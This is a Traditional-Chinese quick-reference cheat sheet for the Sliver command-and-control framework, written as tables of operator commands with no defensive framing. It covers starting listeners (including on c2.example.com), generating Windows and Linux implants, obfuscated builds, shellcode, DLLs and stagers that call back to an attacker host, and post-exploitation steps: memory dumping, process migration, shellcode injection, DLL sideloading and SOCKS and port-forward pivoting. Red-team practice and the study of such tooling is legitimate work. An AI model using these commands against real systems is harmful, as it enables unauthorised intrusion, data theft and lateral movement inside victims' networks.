# Sliver — 指令速查表

## Server 操作

| 指令 | 功能 |
|------|------|
| `jobs` | 列出所有 Listeners |
| `jobs --kill <ID>` | 停止 Listener |
| `jobs --kill-all` | 停止全部 Listeners |
| `sessions` | 列出 Sessions |
| `beacons` | 列出 Beacons |
| `use <ID>` | 進入 Session/Beacon |
| `operators` | 列出已連線 Operators |
| `implants` | 列出已生成的 Implants |
| `loot` | 查看收集的 Loot |
| `hosts` | 已知主機清單 |
| `version` | 顯示版本 |

---

## Listener 啟動

| 指令 | 功能 |
|------|------|
| `mtls --lport 4444` | 啟動 mTLS Listener |
| `https --lport 443` | 啟動 HTTPS Listener |
| `http --lport 80` | 啟動 HTTP Listener |
| `dns --domains c2.example.com` | 啟動 DNS Listener |
| `wg --lport 53` | 啟動 WireGuard Listener |
| `tcp --lport 8888` | 啟動 TCP Listener |

---

## Implant 生成

| 指令 | 功能 |
|------|------|
| `generate --mtls LHOST:4444 --os windows` | Windows mTLS Session |
| `generate beacon --mtls LHOST:4444 --os windows` | Windows mTLS Beacon |
| `generate --https LHOST:443 --os linux` | Linux HTTPS Session |
| `generate --format shellcode --mtls LHOST:4444` | Shellcode 格式 |
| `generate --format dll --mtls LHOST:4444` | DLL 格式 |
| `generate --evasion --mtls LHOST:4444` | 啟用混淆 |
| `generate stager --lhost LHOST --lport 4443` | Stager |

---

## Profile

| 指令 | 功能 |
|------|------|
| `profiles` | 列出 Profiles |
| `profiles new --mtls LHOST:4444 --os windows NAME` | 建立 Profile |
| `profiles generate NAME --save /tmp/` | 從 Profile 生成 |
| `profiles rm NAME` | 刪除 Profile |

## 基本操作（Session 內）

| 指令 | 功能 |
|------|------|
| `info` | Implant 資訊 |
| `whoami` | 當前使用者 |
| `hostname` | 主機名稱 |
| `getuid / getgid / getpid` | UID / GID / PID |
| `env` | 環境變數 |
| `pwd` | 當前目錄 |
| `ls [PATH]` | 列出目錄 |
| `cat FILE` | 讀取檔案 |
| `cd PATH` | 切換目錄 |
| `mkdir PATH` | 建立目錄 |
| `rm FILE` | 刪除檔案 |
| `mv SRC DST` | 移動/重新命名 |
| `download REMOTE [LOCAL]` | 下載檔案 |
| `upload LOCAL REMOTE` | 上傳檔案 |
| `screenshot` | 截圖 |
| `netstat` | 網路連線 |
| `ifconfig` | 網路介面 |

## 執行 & 程序

| 指令 | 功能 |
|------|------|
| `shell` | 互動式 Shell（Session 限定）|
| `execute -o --exe cmd.exe -- /c whoami` | 執行指令取得輸出 |
| `ps` | 列出程序 |
| `ps --exe NAME` | 搜尋程序 |
| `procdump --pid PID` | Dump 程序記憶體 |
| `migrate --pid PID` | 程序遷移 |
| `kill --pid PID` | 終止程序 |

---

## 記憶體執行

| 指令 | 功能 |
|------|------|
| `execute-assembly FILE.exe [ARGS]` | 執行 .NET Assembly |
| `inline-execute bof.o [ARGS]` | 執行 BOF |
| `sideload --process explorer.exe payload.dll` | DLL Sideload |
| `spawndll payload.dll [EXPORT]` | Spawn + DLL |
| `execute-shellcode --pid PID sc.bin` | 注入 Shellcode |

## Beacon 專用

| 指令 | 功能 |
|------|------|
| `tasks` | 待執行任務清單 |
| `tasks fetch` | 取得已完成任務結果 |
| `tasks cancel --id ID` | 取消任務 |
| `sleep 60s` | 設定 Sleep |
| `sleep 60s/20` | Sleep + 20% Jitter |
| `interactive` | 轉為互動 Session |

## Pivoting

| 指令 | 功能 |
|------|------|
| `socks5 start --port 1080` | 啟動 SOCKS5 Proxy |
| `socks5 stop --id ID` | 停止 SOCKS5 |
| `portfwd add --remote HOST:PORT` | 正向 Port Forward |
| `portfwd rm --id ID` | 刪除 Port Forward |
| `rportfwd add --bind-addr 0.0.0.0:8080 --forward-host 127.0.0.1 --forward-port 80` | 反向 Port Forward |
| `pivots tcp --lport 9001` | 啟動 TCP Pivot |
| `pivots rm --id ID` | 刪除 TCP Pivot |
